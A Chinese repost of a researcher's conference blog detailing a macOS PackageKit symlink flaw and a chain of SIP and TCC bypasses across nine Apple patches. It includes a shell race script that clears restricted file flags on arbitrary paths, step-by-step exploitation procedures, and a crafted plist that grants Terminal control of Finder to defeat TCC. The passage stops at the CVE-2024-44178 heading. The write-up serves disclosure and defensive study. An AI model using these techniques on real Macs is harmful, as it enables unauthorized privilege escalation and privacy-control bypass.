#  无休止的漏洞：macOS 漏洞被利用九次   
 Ots安全   2025-02-18 12:12  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
这是我在OBTS v7.0会议上的演讲的博客文章。幻灯片已上传到这里。  
  
苹果必须发布多少个补丁才能真正修复漏洞？答案是“随风飘荡”。🙈  
  
我在 macOS 的PackageKit框架中发现了一个有趣的逻辑漏洞，该漏洞允许将权限提升到root，绕过透明度同意和控制（TCC），以及绕过系统完整性保护（SIP）。  
  
很难相信 Apple 在最终解决该漏洞之前发布了 9 个补丁来尝试解决该漏洞。在这场史诗般的战斗中，我成功收获了一系列 CVE：CVE-2022-26688、CVE-2022-32900、CVE-2023-23497、CVE-2023-27962、CVE-2023-38564、CVE-2023-42853、CVE-2024-23275、CVE-2024-27885、CVE-2024-44178 和 CVE-2025-24099。  
  
由于时间有限，我在OBTS上没有讲到CVE-2024-27885和CVE-2024-44178 。另外，新的CVE-2025-24099是一个变种问题，在大会期间是一个 0day 漏洞，目前已在除夕发布的 macOS 15.3 中得到解决。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhjfM1vIQ1PbnZoRr6pNtNTOUdeIe9nOVIBXic5FBN8MzLFTVDXbnFqjQ/640?wx_fmt=png&from=appmsg "")  
  
关于 SIP 文件系统保护  
  
关于 macOS 系统完整性保护（简称SIP）的文档和博客有很多。为了节省时间，我不会过多地谈论 macOS SIP 的基本知识。在这篇博客中，我们将重点介绍文件系统保护。简而言之，它是一个应用于整个系统的特殊沙箱。配置可以在名为的文件中找到/System/Library/Sandbox/rootless.config。以位置/Library/Apple为例：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhqZtic98M44o4In37ySzalKmqbQgxYKCorhu00yRInttTQBVvx9hzktQ/640?wx_fmt=png&from=appmsg "")  
  
从系统命令的输出中ls，我们可以看到它是受限制的，并且具有特殊的扩展属性：“ com.apple.rootless ”。如果我尝试触摸此位置内的文件，它会返回错误“操作不允许”，即使我以root权限执行该命令。  
  
但是 macOS 系统本身如何更新受保护的文件？  
  
答案是，有些 Apple 签名的服务以强大的CS_INSTALLER权限运行。它们通常使用私有的rootless 相关权限进行签名，以修改受保护的系统位置。  
  
关于 PackageKit 框架  
  
今天要讲的这个漏洞存在于PackageKit框架中，我们先来看一下这个框架。  
  
这是什么？  
  
它是一个私有框架，捆绑了一些可执行二进制文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhIL6iak8E4pMoPHvGyEV81Vdmyx6aWp7m2FqNj7vbe2sbXbL3psiboCOA/640?wx_fmt=png&from=appmsg "")  
  
此框架的职责是安装 PKG 文件。服务“ installd ”用于安装普通（开发者签名或未签名）PKG 文件，而服务“ system_installd ”用于安装Apple 签名的PKG 文件。它们都以root身份运行，在PackageKit框架中共享相同的实现。  
  
这个框架为何如此有吸引力？  
  
对于“ installd ”服务，它可以被利用来提升 root 权限。  
  
此外，“ system_installd ”服务已使用强大的授权“ com.apple.rootless.install.heritable ”进行签名。因此，此服务及其所有子进程将拥有强大的CS_INSTALLER权限来修改受SIP保护的文件。因此，可以利用它来绕过SIP保护，也就是完全绕过TCC。  
  
另一方面，历史上披露的漏洞也不少，我自己发现的漏洞大概有40多个。  
  
攻击面  
  
该框架内存在许多可能的攻击面。  
- 第一个主要攻击面存在于安装操作中：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hhrz6ibDlCcwjxu6Mee2Rj9vDutaTRe6J4lsB1l9tHOyY6AEjYIdV6gSg/640?wx_fmt=png&from=appmsg "")  
  
我们在这里可以看到，实现了超过 20 种不同的操作。有些操作可以在 PKG 安装过程中的一些特殊场景中触发。  
  
第二个命令攻击面存在于PKG 文件中的安装操作脚本中。对于Apple 签名的 PKG文件，可以利用它们绕过 SIP。对于其他 PKG文件，可以利用它们来获得root 权限提升。  
  
主要工作流程  
  
installd和system_installd服务具有相同的主要工作流程。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hh2TpQ36lce398wEo13RKnekibmysmzlqybUSKxFWatNad3ORTg1gEMrQ/640?wx_fmt=png&from=appmsg "")  
  
从中install.log我们可以看到，在 PKG 安装过程中至少有三个安装操作可以默认触发：  
1. PKExtractInstallOperation旨在将Payload 内容从 PKG 文件提取到安装沙盒根路径。  
  
1. PKRunPackageScriptInstallOperation负责执行PKG文件中嵌入的安装操作脚本。  
  
1. PKShoveInstallOperation旨在将Payload 内容从安装沙箱存储库推送到安装目标路径。  
  
PKShoveInstall操作  
  
过去，我曾披露过前两个安装操作中的一些漏洞。今天，我们重点关注最后一个，即PKShoveInstallOperation。  
  
在逆向Objective-C类“ PKCoreShove ”之后，我发现shove逻辑有点复杂。它不等同于move操作。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hhv8rkQmCXPed0vkGR85fcjAtwDiaVASQ65oNiaXXRtTXReY1OfebTqYAQ/640?wx_fmt=png&from=appmsg "")  
  
在大多数情况下，它会调用名为“ -[PKCoreShove _relinkFile:dest:] ”的方法，该方法内部调用API。如果源路径和目标路径都是目录，它会通过递归调用方法“ -[PKCoreShove shoveOneLevel:dest:] ”rename来处理这种情况  
  
如果源路径是一个目录，而目标路径是一个符号链接，那么会发生什么？  
  
CVE-2022-26688  
所以，我的动机来自于这个问题：  
  
如果我用符号链接替换目标目录并安装 Apple 签名的 PKG 文件，它会跟随符号链接并将 PKG 有效负载内容重定向到另一个受限位置吗？  
  
然后我尝试了一下并立即发现了CVE-2022-26688：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhjeMOPU55ic47wau6cCOeiacjnKp0hp0xy0N3Hk8wS45flmZaoXiaTrjXg/640?wx_fmt=png&from=appmsg "")  
  
今天的故事就以一个有趣的逻辑漏洞开始。该漏洞可直接用于绕过 SIP 文件系统保护。  
  
漏洞利用  
  
我的问题的测试过程也是利用过程：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hhmw4GcPSMWgliah6POK0zof8XjlRhdKdOtjokEnf8flWnia5fpCM9dowA/640?wx_fmt=png&from=appmsg "")  
  
我们可以看到测试环境是 macOS 12.0.1，并且 SIP 状态为启用。  
  
在利用该漏洞之前，该位置/Library/Apple受到限制并且具有特殊的无根扩展属性，因此我无法在此目录中写入。  
  
该漏洞只是从有效载荷目标路径创建到任意受限目录的符号链接。  
  
接下来，安装 Apple 签名的PKG文件。PKShoveInstallOperation会将有效负载内容从安装沙盒存储库推送到目标路径。  
  
令我惊讶的是，推送过程不仅会跟踪符号链接并将有效载荷内容推送到受限位置，还会清除受限文件标志并删除已解析目标路径的无根扩展属性！  
  
因此，我可以在受限位置写入和删除任意文件，因为它现在不受限制了。  
  
根本原因  
那么，幕后到底发生了什么？  
  
为了快速找到相关的进程和函数，我建议使用 Instruments.app ，配合Xcode。因为这个工具不仅可以监视文件操作，还可以提供有价值的调用堆栈跟踪信息（有点像windows 上的procmon）：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhdfzYODkDSvqJvfHYf0m3nRTjyyRxP27w0AjzrtZdW4wYibmIyiaChPbw/640?wx_fmt=png&from=appmsg "")  
  
我们可以看到，执行文件操作的是shove进程。shove 进程是由system_installd服务衍生的，因此它会继承强大的CS_INSTALLER权限来修改受 SIP 保护的路径。  
  
同时我们还可以看到文件操作是由名为“ -[PKCoreShove relinkFile:dest:sourceAttribs:destAttribs:] ”的函数调用的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhCvjZrE51OMmGb2NOPS9vd5xJ8d9bJKaNOPF7ePias7Vyhaiamb8KvBrQ/640?wx_fmt=png&from=appmsg "")  
  
深入研究该函数后，我们可以看到：  
- 在第31行，它调用renameAPI直接推送Payload内容。  
  
- 在第 65 行，它调用另一种方法来传播目标路径的文件标志和扩展属性。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hh2WJLRRmuDdC7VfvhqibSybia2Wel9thMSdnAdJ78XX4OMS7t1DpaBj3Q/640?wx_fmt=png&from=appmsg "")  
  
进入文件属性传播函数，我们可以看到：  
- 在第 177 行，它调用 APIlchflags来清除目标路径的受限文件标志。  
  
- 在第 200 行，它使用 APIremovexattr删除特殊的无根扩展属性。  
  
第一个补丁  
  
Apple 首先在 macOS 中修补了此漏洞12.3：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hh38nibGw5OTK5CovZ7qtWYswicxOUjLv9XqPia2zrTWiaia0PO7nFgHdktdQ/640?wx_fmt=png&from=appmsg "")  
  
正如日志字符串所暗示的，如果原始目标路径不受信任，而解析的目标路径受信任，则它将不会遵循符号链接。  
  
接下来，它首先从目标路径中删除符号链接，然后调用函数“ -[PKCoreShove _relinkFile:dest:] ”。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhT4mKiaHUSoG48kUVHnovtTDCSDh6H8KNDAp9L77X7zbw5IzF7K5evNA/640?wx_fmt=png&from=appmsg "")  
  
这似乎直接阻止了我以前的开发。  
  
但这足够安全吗？  
  
CVE-2022-32900  
当然不是，CVE-2022-32900是它的绕过方法：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hhrjz2wVzjU4loibFYaHKl7Acs3WMAUoicUoD8R1Yia7Io4kVdtWZYPZ7dg/640?wx_fmt=png&from=appmsg "")  
  
绕过思路如下：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhhxUta3XCEjkP4P3unZsm3RpibbqoMbFzwic3BytZfBEu61yqOLVLHKcw/640?wx_fmt=png&from=appmsg "")  
  
我发现，如果原始目标路径和解析的目标路径都不受信任，那么它将直接跟随符号链接。  
  
解析后的目标路径不受信任，但其中的子路径可以受限制和受信任。例如，创建一个符号链接，让原始目标路径指向不受限制的目录/Library，shove 进程将遵循符号链接并覆盖受限制的子目录/Library/Apple。  
  
接下来，挑战出现了。  
  
为了覆盖受限子目录，我需要找到一个 Apple 签名的 PKG 文件，其中包含特殊的 Payload 内容：“ $SandboxRepo/Root/XXX/YYY/Apple ”。  
  
但是，我发现如果我将 Apple 签名的 PKG 文件安装到已挂载的磁盘映像卷，则安装沙盒存储库不受 SIP 保护。  
  
尽管沙盒存储库是由 API 创建的rootless_mkdir_restricted，并且ls命令表明它受到限制，但它根本没有受到限制！所以我可以直接从磁盘映像卷修改 Payload 内容。  
  
漏洞利用和演示  
漏洞代码已上传至此处的GitHub 链接。https://github.com/jhftss/POC/tree/main/CVE-2022-32900  
  
演示视频：https://youtu.be/7lOzIgxFvaM  
  
第二个补丁  
  
Apple 在 macOS 中再次修补了此漏洞12.6：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhXM6G0RW1oDhqkAuGHNTicRR4uUKWFW4cZ9gcWFYpspWk91Bf3lw28uQ/640?wx_fmt=png&from=appmsg "")  
  
现在在函数中-[PKShoveInstallOperation _shoveExtractedRootOntoDestinationReturningError:]，如果提取的有效载荷路径不受信任，那么shove命令将使用附加参数“ -D ”生成，如下所示：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhVRJiajVfMtHpZjXBhiaiaqwZp669fSesb4thrGfVgJhE58Vh2neu1q2KA/640?wx_fmt=png&from=appmsg "")  
  
然后在shove过程中，它将使用 API“ csops ”放弃强大的CS_INSTALLER权限：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hhn8VxHicXpQPRO2l2tr094bic1Loa0W1dto2KrmAsjqqgyejVPWneH29g/640?wx_fmt=png&from=appmsg "")  
  
该解决方案似乎合理并再次终止了我的开发。  
  
但现在可以了吗？  
  
CVE-2023-23497  
还没有，CVE-2023-23497再次被绕过：  
  
新问题  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhXM6G0RW1oDhqkAuGHNTicRR4uUKWFW4cZ9gcWFYpspWk91Bf3lw28uQ/640?wx_fmt=png&from=appmsg "")  
  
在第 84 行和第 86 行，它使用不安全的 API rootless_check_trusted和检查提取的 payload 路径是否可信rootless_protected_volume。但是使用符号链接很容易绕过它们！  
  
漏洞利用和演示  
以下是我再次利用此问题的方法：  
- 创建 DMG 文件并将其挂载到目录/tmp/.exploit  
  
- 将 Apple 签名的 PKG 文件安装到卷/tmp/.exploit  
  
- 在system_installd调用 API rootless_check_trusted之前，将提取的有效负载路径替换为指向受限位置的符号链接。  
  
- “shove”命令将在没有参数-D 的情况下生成，并且不会删除SIP(CS_INSTALLER) 权限。  
  
- 将提取的有效载荷路径替换为我们真正的有效载荷。  
  
然后我遇到了一个新的挑战：shove 进程不会遵循符号链接，因为源路径和解析的目标路径不在同一设备上。源路径来自已挂载的磁盘映像设备，而解析的目标路径位于根卷设备上。  
  
解决方案是创建一个符号链接，让安装沙盒存储库指向 Root 卷设备上的路径。然后shove进程将再次遵循符号链接！  
  
演示视频：https://youtu.be/Min4ye0XL88  
  
第三个补丁  
  
Apple 在 macOS 中再次修复了该问题13.2：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhQR5cP7ibFXCKENP50qefibCf99lzIg0yC64OicI6vBp0ZuWp1MmiaFX4Lw/640?wx_fmt=png&from=appmsg "")  
  
它使用安全 API rootless_check_trusted_fd。使用标志打开文件描述符来打开符号链接本身，而不是解析符号链接。  
  
CVE-2023-27962  
然而，补丁发布后又出现了一个令人啼笑皆非的新问题。  
  
CVE-2023-27962被分配给新问题：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhS3dicCURRjUzXiaj2dhsk4oNdVkB8274yUXK4wPg5mBhg3HkmTLficCsg/640?wx_fmt=png&from=appmsg "")  
  
新推出的问题  
  
在逆向patch函数之后，我发现了一个新的粗心的编码问题：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhwVAKr9mEboDmnZpkGSshd786DsyjiaibNK7jZDcOLY0p2Xny89oZYuqg/640?wx_fmt=png&from=appmsg "")  
  
这里检查的是shoveToolPath是否受到 SIP 完全保护，而不是像之前一样检查提取的有效载荷路径。当然，来自系统私有框架的shoveToolPath受到 SIP 的限制和完全保护。  
  
因此第 37 行的检查总是返回 true！  
  
漏洞利用和演示  
  
漏洞代码已上传至此处的GitHub 链接。https://github.com/jhftss/POC/tree/main/CVE-2023-27962  
  
演示视频：https://youtu.be/rEkLNAtS5U4  
  
第 4 个补丁  
  
Apple 立即在 macOS 中再次修复了该问题13.3：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhYIqFp0pcgdgcETRicNcBrbgnEibByk2lpUejObQlTChDXb49ryI8CO8A/640?wx_fmt=png&from=appmsg "")  
  
再次，它检查提取的有效载荷路径，而不是系统的shoveToolPath。  
  
但现在够安全了吗？  
  
CVE-2023-38564  
  
还没有，CVE-2023-38564再次被绕过：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hh33VduqllhNYpmI8sLLXCoubBPZ8T3MEjD7rcKAKeFicqBp7bOrUrsvw/640?wx_fmt=png&from=appmsg "")  
  
问题  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhYIqFp0pcgdgcETRicNcBrbgnEibByk2lpUejObQlTChDXb49ryI8CO8A/640?wx_fmt=png&from=appmsg "")  
  
一方面，在第44行，如果父路径组件是符号链接，open带标志的APIO_SYMLINK仍会跟踪。找到名为的受限文件夹Root，则第48行的检查将再次被绕过。  
  
另一方面，可以使用已安装的磁盘映像卷来控制安装沙盒存储库。  
  
漏洞利用  
  
为了再次利用此问题，我们需要了解沙盒存储库。  
  
它是由函数“ -[PKInstallSandboxManager  
  
_sandboxRepositoryForDestination:forSystemSoftware:create:error:] “  
- 如果安装目标是ROOT“ / ”：  
  
- 对于 Apple 签名的 PKG： /Library/Apple/System/Library/InstallerSandboxes/.PKInstallSandboxManager-SystemSoftware  
  
- 对于其他 PKG：/Library/InstallerSandboxes/.PKInstallSandboxManager  
  
- 如果安装目标不是ROOT：  
  
- 对于 Apple 签名的 PKG：$targetVolume/.PKInstallSandboxManager-SystemSoftware  
  
- 对于其他 PKG：$targetVolume/.PKInstallSandboxManager  
  
以下是我如何利用 mount 技巧再次利用此问题的方法：  
1. 创建DMG文件并将其挂载到目录/tmp/.exploit。  
  
1. 将 Apple 签名的 PKG 安装到该卷/tmp/.exploit。  
  
1. 在函数“ -[PKInstallSandboxManager _sandboxRepositoryForDestination:forSystemSoftware:create:error:] ”中，一旦它创建并返回路径/tmp/.exploit/.PKInstallSandboxManager-SystemSoftware（在 DMG 卷内）作为其沙盒存储库，我就可以立即弹出DMG 卷。然后沙盒存储库将位于根卷上，前缀为路径/tmp/.exploit。  
  
1. 接下来，该服务将使用 API rootless_mkdir_restricted在沙盒存储库内创建受限有效负载目录。  
  
1. 有效载荷目录受到限制，因此shove命令不会放弃 SIP 权限。  
  
1. 无法直接修改 payload 目录，但我可以再次挂载另一个 DMG 文件/tmp/.exploit。然后它将不受限制，因此我可以在那里部署我的恶意 payload。  
  
第 5 个补丁  
  
Apple 在 macOS 中再次修复了该问题13.5：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhoWWEia65Bz8guvV4ofyDETfoTIxaef5qs3ZFeRiaCb40APKkPR9oge7A/640?wx_fmt=png&from=appmsg "")  
  
现在，它会检查安装沙盒存储库是否受信任。因此挂载技巧无法再绕过此处的检查。  
  
同时，苹果采纳了我在PoC 2022大会上提出的建议（幻灯片第 79 页）：  
  
现在，如果安装目标路径不是根卷，它将使用非特权的installd服务来处理Apple 签名的 PKG文件的安装请求，而不是特权的system_installd服务！  
  
做得好，但是现在足够安全了吗？  
  
CVE-2023-42853  
还没有，CVE-2023-42853又是绕过方法：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hh0AA6jbeJ9ibY165ZKPzWS00MMOQkR2pj1Gg3NgOcrxgsibmRPZAQxssA/640?wx_fmt=png&from=appmsg "")  
  
问题  
  
我们再来回顾一下推挤逻辑：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hh7aj8LgbltoSBjicJbuV54VoicfeJmK9mIcmDZc5Rr7ibofx4eTYW7Wj3A/640?wx_fmt=png&from=appmsg "")  
  
如果源路径是目录，而目标路径是符号链接，则会确定是否遵循解析后的目标路径：  
  
如果原始目的地不受限制，而解析后的目的地受限制，则不会跟随解析后的目的地。否则，它将跟随解析后的目的地，并将 Payload 内容推送到那里。  
  
推送到解析的目的地后，它将传播文件标志和扩展属性。  
  
它使用 API 检查路径是否可信rootless_check_trusted_fd：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hh7adic7scjVn7cruroVmdXmX5rvChsYvHaDVc4oyYI55cj0jkYqqg2Kw/640?wx_fmt=png&from=appmsg "")  
  
但是该API只能检查文件标志SF_RESTRCITED，而特殊文件标志SF_NOUNLINK则被忽略！  
  
漏洞利用和演示  
  
因此，我做了一个测试：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhQ8f55D6LthGk3yYpKHhJShwQyKN03pY4Nc8faPyQJpG0icJxhJkbMGg/640?wx_fmt=png&from=appmsg "")  
  
首先，我创建了一个符号链接到具有特殊文件标志SF_NOUNLINK的位置，例如目录/Library/Application Support，由于特殊文件标志而无法挂载。  
  
然后我安装了苹果签名的 PKG 文件。结果，shove进程跟踪了符号链接并清除了特殊文件标志。然后它就变得可挂载了！  
  
因此可以利用此问题完全绕过TCC保护：  
1. 滥用 SIP-bypass 原语来清除任意路径的文件标志（SF_NOUNLINK），例如“ /Library/Application Support ”。  
  
1. 创建DMG文件并挂载到路径“ /Library/Application Support ”。  
  
1. 将精心设计的TCC.db放在路径“ /Library/Application Support/com.apple.TCC ”中，即可完全绕过 TCC！  
  
演示视频：https://youtu.be/PT0iuaGJ9LY  
  
第 6 个补丁  
  
Apple 在 macOS 中再次修复了该问题14.1：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhBqHIzPkRW9xgBU0gMSzBlru4niaDza4CTIlw8cicTia5Klefic7nw7Zn6w/640?wx_fmt=png&from=appmsg "")  
  
现在在函数中PKSIPFullyProtected，如果文件路径具有特殊的SF_NOUNLINK标志，那么它也将被视为受到SIP 完全保护。  
  
现在看起来好多了，但这足够安全吗？  
  
CVE-2024-23275  
还没有，CVE-2024-23275再次被绕过：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhFhaUlaFRwSsvZuDCbmxQOUegMFrKVLTmGdDKtKnIiaTtA0IeZ2TjYCw/640?wx_fmt=png&from=appmsg "")  
  
问题  
  
因此，它会检查解析的目标路径是否受到 SIP 完全保护：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhWcCf00Libd0PuicwE5icwEJIdhPtTZBhfyNWSHxZg0sTicN9rLDAS8NNiaw/640?wx_fmt=png&from=appmsg "")  
  
但是解析后的目标路径是用标志“ O_NOFOLLOW ”打开的，而不是用标志“ O_NOFOLLOW_ANY ”。所以我不能直接用符号链接替换解析后的目标路径。但我可以用符号链接替换父路径组件。在调用openAPI 之前，创建一个符号链接以指向不受限制的位置。在通过第 291 行的检查后，让符号链接指向受限制的位置以清除其受限制文件标志。  
  
漏洞利用  
漏洞利用脚本如下：  
  
```
#!/bin/sh# Usage: exploit.sh /path/to/target (clear the target's file flag: "SF_RESTRICTED", "SF_SF_NOUNLINK")TARGET_DIR=`dirname "$1"`TARGET_NAME=`basename "$1"`echo'target dirname:'$TARGET_DIR', target basename:'$TARGET_NAMEmkdir "/tmp/$TARGET_NAME"ln -f -h -s /tmp /tmp/lnkln -f -h -s "/tmp/lnk/$TARGET_NAME" /Library/Application\ Support/ResearchSoftecho'waiting for the installation...'# waiting for the shove process opening the untrusted /tmp/$TARGET_NAMEwhiletrue ; doif lsof -c shove | grep "/tmp/$TARGET_NAME"then    breakfidoneecho'replacing the symlink...'ln -f -h -s "$TARGET_DIR" /tmp/lnkecho'all done.'
```  
  
  
它可用于清除任意路径的限制文件标志。  
  
第 7 个补丁  
  
Apple 在 macOS 中再次修补了此问题14.4：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hh4I5UpcxNs8Jo1S0zWZGDHA5lRibnaEV03OjlDepGwP0oUccCaXxrwPg/640?wx_fmt=png&from=appmsg "")  
  
现在，如果原始目标路径不受信任，则解析的目标路径将使用标志“ O_NOFOLLOW_ANY ”打开。此标志将终止路径中的任何类型的符号链接。  
  
但功绩永无止境。  
  
CVE-2024-27885  
CVE-2024-27885再次被绕过：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hh7wKcxKhELibMKWaKNGcERNSOyrkQJRlDtoGLm1PpuoQiaHsF8tVCq2bg/640?wx_fmt=png&from=appmsg "")  
  
如前所述，推送到安装目标路径后，它将传播目标路径的文件标志和扩展属性。 受限文件标志可以通过 API lchflags清除。  
  
问题  
  
API lchflags被设计为不遵循符号链接：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hh4SicIKZqrQTKHxhiaVlHp72gcmdfS7EbehrgeUQmhjEv1QnpxoSURgtg/640?wx_fmt=png&from=appmsg "")  
  
但是该API的实现太过草率：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhlncZWM4MeohJhywmicriapqvaUxujfb1xuaibFV5AIRfHviaXCgiaZQ4loQ/640?wx_fmt=png&from=appmsg "")  
  
它使用第 6 行的 API lstat检查给定路径是否是符号链接：  
- 如果路径是符号链接，它将使用带有选项FSOPT_NOFOLLOW的 API setattrlist。  
  
- 如果路径不是符号链接，它仍将使用 API chflags，该 API 将遵循符号链接。  
  
- 所以这是一个经典的TOCTOU问题。在通过第 6 行 API lstat的检查后，攻击者可以用符号链接替换路径。因此，它使用 API chflags并直接跟踪符号链接以清除任意路径的限制文件标志。  
  
Apple 在 macOS 13.3 中将这个旧问题（CVE-2023-40383）进行了如下处理：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhnlIaFc1aWVA6Pl2qfuDFcHVDbbleqbibiclhCZR2eQwHTvnL5P8cu4bg/640?wx_fmt=png&from=appmsg "")  
  
现在在 API lchflags中，它删除了 API chflags的调用，始终使用带有选项FSOPT_NOFOLLOW的API setattrlist。  
  
但是，如果我用符号链接替换父路径组件，它仍将遵循符号链接，因为它不使用选项FSOPT_NOFOLLOW_ANY (0x800)。  
  
PKCoreShove使用 API lchflags清除安装目标路径的文件标志：  
  
```
void -[PKCoreShove _propagateFileModification:flags:xattrs:](void *a1, void *a2, int a3, void *a4){//...    if ( lchflags(path, v42) )//...}
```  
  
  
漏洞利用  
  
例如，安装 Apple 签名的WorkflowExtensionsSDK.pkg将把 Payload 内容推送到目标路径，如：/Library/Developer/SDKs/WorkflowExtensionSDK.sdk/Library。  
  
在安装Apple签名的PKG之前，请执行以下命令进行准备：  
  
```
mkdir -p /Library/Developer/SDKs/WorkflowExtensionSDK.sdk/Librarychflags 6 /Library/Developer/SDKs/WorkflowExtensionSDK.sdk/Library
```  
  
  
这将触发PKCoreShove在安装过程中清除路径的文件标志：  
  
```
lchflags("/Library/Developer/SDKs/WorkflowExtensionSDK.sdk/Library", 0);
```  
  
  
在 shove 进程调用 API lchflags之前，race 将父路径组件替换/Library/Developer/SDKs/WorkflowExtensionSDK.sdk为指向 的符号链接/。  
  
结果，该路径的文件标志SF_NOUNLINK/Library将被清除。  
  
第二阶段漏洞  
  
我们能在先前的基础之上获得更多吗？  
  
/Library即使文件标志SF_NOUNLINK已被清除，该路径仍然不可挂载。  
  
事实是，某些受限文件标志的丢失已经破坏了系统完整性保护的信任链。  
  
例如，这原语可以使一些受限制的路径变得可挂载！通过滥用原语清除路径的限制标志（0x80000）/Library/Apple/Library，我就可以挂载它了。  
  
我一直说，SIP Bypass 就是 Full TCC Bypass。接下来，将文件修改/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist为以下内容：  
  
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plistversion="1.0"><dict><key>Services</key><dict>    <key>AppleEvents</key>    <array>      <dict>        <key>CodeRequirement</key>        <string>identifier com.apple.Terminal</string>        <key>IdentifierType</key>        <string>bundleID</string>        <key>Identifier</key>        <string>com.apple.Terminal</string>        <key>Comment</key>        <string>40394397</string>        <key>AEReceiverIdentifier</key>        <string>com.apple.finder</string>        <key>AEReceiverIdentifierType</key>        <string>bundleID</string>        <key>AEReceiverCodeRequirement</key>        <string>identifier com.apple.finder</string>      </dict>    </array></dict></dict></plist>
```  
  
  
因此，Terminal.app能够向发送任意AppleEvent ，Finder.app从而完全绕过TCC！  
  
请注意，在将此漏洞提交给 Apple 后，Apple/Library/Apple/Library/Bundles/TCC_Compatibility.bundle自 macOS 15.0 Beta 3 起已淘汰该补丁：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhIbr4qdfmpr5RGtLwjY7pCWO1NloROibYyfaqbHAsxrPpfzPgLTzN67g/640?wx_fmt=png&from=appmsg "")  
  
第 8 个补丁  
  
Apple 在 macOS 中再次修补了此问题14.5：  
  
```
void -[PKCoreShove _propagateFileModification:flags:xattrs:](void *a1, void *a2, int a3, void *a4){//...    fd = open(path, O_SYMLINK|O_NOCTTY|O_NONBLOCK);//...    if ( fchflags(fd, v48) )//...}
```  
  
  
现在，它使用 API fchflags，而不是 API lchflags。  
  
但现在可以了吗？  
  
CVE-2024-44178  
还没有，CVE-2024-44178再次被绕过：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhRDhPgKhqXvTFNoA3Bff9At4vZZUOOCvGJFprnaerfXnwHYmICCPZrw/640?wx_fmt=png&from=appmsg "")  
